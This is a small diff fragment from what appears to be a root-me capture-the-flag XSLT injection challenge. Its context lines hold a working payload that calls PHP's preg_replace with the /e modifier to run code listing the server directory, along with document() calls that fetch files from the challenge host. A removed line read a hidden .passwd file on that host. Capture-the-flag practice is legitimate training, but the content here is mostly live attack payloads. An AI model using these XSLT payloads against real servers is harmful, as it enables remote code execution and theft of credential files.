@@ -18,6 +18,6 @@
 <xsl:value-of select="php:function('preg_replace', '/a/e', 'print_r(scandir(getcwd()))', 'hallo')" />
 beers.xml
   <xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/beers.xml')"/>
-<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
+
   
 </html>
